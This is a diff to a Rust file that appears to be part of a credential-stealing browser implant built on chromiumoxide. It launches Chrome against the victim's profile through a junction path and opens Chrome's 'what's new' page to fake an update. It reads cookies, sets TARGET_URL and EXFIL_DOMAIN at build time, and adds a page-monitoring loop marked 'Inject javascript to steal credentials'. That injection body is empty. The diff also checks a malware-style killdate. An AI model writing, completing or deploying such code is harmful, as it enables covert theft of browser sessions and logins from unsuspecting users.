@@ -1,55 +1,70 @@
-use futures::StreamExt;
 use chromiumoxide::browser::{Browser, BrowserConfig};
 use std::path::PathBuf;
-use std::time::Duration;
+use futures::StreamExt;
+use tokio::time::{sleep, Duration};
 
-pub async fn start_browser(junc_path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
+pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error::Error>> {
     let (mut browser, mut handler) = Browser::launch(
             BrowserConfig::builder()
             .with_head()
             .arg("--start-maximized")
             .arg("--no-startup-window")
+            .arg("--disable-background-networking")
             .user_data_dir(&junc_path)
             .viewport(None)
             .disable_default_args()
             .build()?
         ).await?;
 
-    let handle = async_std::task::spawn(async move {
-        while let Some(h) = handler.next().await {
-            if h.is_err() {
-                break;
-            }
-        }
-    });
-
-    // Open page for whats new (simulate update)
-    let _ = browser.new_page("https://developer.chrome.com/new").await?;
-
-    #[cfg(feature = "debug")]
-    println!("[*] Sleeping (10 secs for test) ...");
-    async_std::task::sleep(Duration::from_secs(10)).await;
+    let _ = tokio::spawn(async move { while let Some(_) = handler.next().await {} });
 
     #[cfg(feature = "debug")]
     println!("[*] Retrieving cookies...");
     let cookies = browser.get_cookies().await?;
 
-    #[cfg(feature = "debug")]
     if cookies.is_empty() {
-        println!("[!] No cookies found.");
+        // Open page for whats new (simulate update)
+        let _ = browser.new_page("https://developer.chrome.com/new").await?;
     } else {
-        println!("[+] Cookies Found:");
-        cookies.iter().for_each(|cookie| {
-            println!(
-                "[>] Name: {}\n    Domain: {}\n    Expires: {}",
-                cookie.name, cookie.domain, cookie.expires
-            );
-        });
+        let _ = browser.new_page("chrome://newtab").await?;
     }
 
+    let target_url = env!("TARGET_URL");
+    let exfil_domain = env!("EXFIL_DOMAIN");
+    #[cfg(feature = "debug")] {
+        println!("[*] Using target url: {}", target_url);
+        println!("[*] Using exfil domain: {}", exfil_domain);
+    }
+
+
+    // Monitor pages
+    loop {
+        let pages = browser.pages().await?;
+
+        // If the number of pages is empty, we close the browser
+        if pages.is_empty() {
+            break;
+        }
+
+        // Inject javascript to steal credentials
+
+
+        // Wait for a second before checking again
+        sleep(Duration::from_secs(1)).await;
+    }
+
+    #[cfg(feature = "debug")]
+    println!("[*] Checking killdate...");
+    let page = browser.new_page("about:blank").await?;
+
+    let current_timestamp = page.evaluate("Math.floor(Date.now() / 1000)").await?.into_value::<u64>()?;
+    let killdate_timestamp: u64 = env!("KILLDATE_TIMESTAMP").parse()?;
+
+    // Compare the timestamps
+    let is_past_killdate = current_timestamp > killdate_timestamp;
+
     browser.close().await?;
-    handle.await;
     browser.wait().await?;
 
-    Ok(())
+    Ok(is_past_killdate)
 }
